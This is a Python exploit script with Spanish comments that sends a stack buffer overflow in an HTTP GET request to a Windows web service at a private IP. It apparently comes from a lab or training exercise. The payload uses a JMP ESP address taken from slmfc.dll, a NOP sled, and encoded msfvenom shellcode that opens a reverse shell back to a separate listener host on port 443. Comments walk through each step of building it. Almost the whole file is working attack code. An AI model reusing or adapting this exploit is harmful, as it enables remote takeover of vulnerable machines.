#!/usr/bin/python

import socket, sys
from struct import pack

def explotacion():
    
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.112.168 LPORT=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
    
    shellcode=("\xba\x10\x7a\xac\x53\xd9\xc4\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
                "\x52\x31\x55\x12\x03\x55\x12\x83\xd5\x7e\x4e\xa6\x29\x96\x0c"
                "\x49\xd1\x67\x71\xc3\x34\x56\xb1\xb7\x3d\xc9\x01\xb3\x13\xe6"
                "\xea\x91\x87\x7d\x9e\x3d\xa8\x36\x15\x18\x87\xc7\x06\x58\x86"
                "\x4b\x55\x8d\x68\x75\x96\xc0\x69\xb2\xcb\x29\x3b\x6b\x87\x9c"
                "\xab\x18\xdd\x1c\x40\x52\xf3\x24\xb5\x23\xf2\x05\x68\x3f\xad"
                "\x85\x8b\xec\xc5\x8f\x93\xf1\xe0\x46\x28\xc1\x9f\x58\xf8\x1b"
                "\x5f\xf6\xc5\x93\x92\x06\x02\x13\x4d\x7d\x7a\x67\xf0\x86\xb9"
                "\x15\x2e\x02\x59\xbd\xa5\xb4\x85\x3f\x69\x22\x4e\x33\xc6\x20"
                "\x08\x50\xd9\xe5\x23\x6c\x52\x08\xe3\xe4\x20\x2f\x27\xac\xf3"
                "\x4e\x7e\x08\x55\x6e\x60\xf3\x0a\xca\xeb\x1e\x5e\x67\xb6\x76"
                "\x93\x4a\x48\x87\xbb\xdd\x3b\xb5\x64\x76\xd3\xf5\xed\x50\x24"
                "\xf9\xc7\x25\xba\x04\xe8\x55\x93\xc2\xbc\x05\x8b\xe3\xbc\xcd"
                "\x4b\x0b\x69\x41\x1b\xa3\xc2\x22\xcb\x03\xb3\xca\x01\x8c\xec"
                "\xeb\x2a\x46\x85\x86\xd1\x01\x6a\xfe\xa9\x79\x02\xfd\x49\x7b"
                "\x68\x88\xaf\x11\x9e\xdd\x78\x8e\x07\x44\xf2\x2f\xc7\x52\x7f"
                "\x6f\x43\x51\x80\x3e\xa4\x1c\x92\xd7\x44\x6b\xc8\x7e\x5a\x41"
                "\x64\x1c\xc9\x0e\x74\x6b\xf2\x98\x23\x3c\xc4\xd0\xa1\xd0\x7f"
                "\x4b\xd7\x28\x19\xb4\x53\xf7\xda\x3b\x5a\x7a\x66\x18\x4c\x42"
                "\x67\x24\x38\x1a\x3e\xf2\x96\xdc\xe8\xb4\x40\xb7\x47\x1f\x04"
                "\x4e\xa4\xa0\x52\x4f\xe1\x56\xba\xfe\x5c\x2f\xc5\xcf\x08\xa7"
                "\xbe\x2d\xa9\x48\x15\xf6\xd9\x02\x37\x5f\x72\xcb\xa2\xdd\x1f"
                "\xec\x19\x21\x26\x6f\xab\xda\xdd\x6f\xde\xdf\x9a\x37\x33\x92"
                "\xb3\xdd\x33\x01\xb3\xf7")
    
    offset=1788
    buffer="A"*offset
    #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    #jmp ESP
    #copiar oppcode
    #buscar en una dll del programa
    #!mona modules
    #tiene que tener las protecciones todo false
    #!mona find -s "\xff\xe4" -m slmfc.dll
    #ver que la direccion no tenga un badchar y copiar cualquiera
    buffer+=pack("<L",0x76826c28) #0x75e84e5b
    buffer+="\x90"*20
    buffer+=shellcode
    
    try:
            
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.112.138',80))
        s.send('GET'+buffer+'HTTP/1.1\r\n\r\n')
        data = s.recv(1024)
    except:
        print("\n[!] Ha habido un error de conexion\n")
        sys.exit(1)
    

        


if __name__ == "__main__":
    explotacion()